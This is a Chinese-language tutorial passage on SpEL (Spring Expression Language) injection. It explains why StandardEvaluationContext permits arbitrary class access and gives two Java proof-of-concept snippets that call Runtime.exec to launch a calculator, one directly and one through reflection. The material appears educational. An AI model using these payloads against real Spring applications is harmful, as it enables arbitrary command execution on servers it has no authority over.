# SpEL表达式注入
## 漏洞原理

`SimpleEvaluationContext` 和 `StandardEvaluationContext` 是 SpEL 提供的两个 `EvaluationContext`：
- SimpleEvaluationContext : 针对不需要 SpEL 语言语法的全部范围并且应该受到有意限制的表达式类别，公开 SpEL 语言特性和配置选项的子集。
- StandardEvaluationContext : 公开全套 SpEL 语言功能和配置选项。您可以使用它来指定默认的根对象并配置每个可用的评估相关策略。
`SimpleEvaluationContext` 旨在仅支持 SpEL 语言语法的一个子集，不包括 Java 类型引用、构造函数和 bean 引用；而 `StandardEvaluationContext` 是支持全部 SpEL 语法的。

由前面知道，SpEL 表达式是可以操作类及其方法的，可以通过类类型表达式 `T(Type)` 来调用任意类方法。这是因为在不指定 `EvaluationContext` 的情况下默认采用的是 `StandardEvaluationContext`，而它包含了 SpEL 的所有功能，在允许用户控制输入的情况下可以成功造成任意命令执行。

如下，前面的例子中已提过：

```java
public class BasicCalc {  
    public static void main(String[] args) {  
        String spel = "T(java.lang.Runtime).getRuntime().exec(\"calc\")";  
        ExpressionParser parser = new SpelExpressionParser();  
        Expression expression = parser.parseExpression(spel);  
        System.out.println(expression.getValue());  
    }  
}
```

## 通过反射的方式进行 SpEL 注入
- 因为这里漏洞原理是调用任意类，所以我们可以通过反射的形式来展开攻击：

```java
public class ReflectBypass {  
    public static void main(String[] args) {  
        String spel = "T(String).getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"calc\")";  
        ExpressionParser parser = new SpelExpressionParser();  
        Expression expression = parser.parseExpression(spel);  
        System.out.println(expression.getValue());  
    }  
}
```
### 基础Poc&Bypass






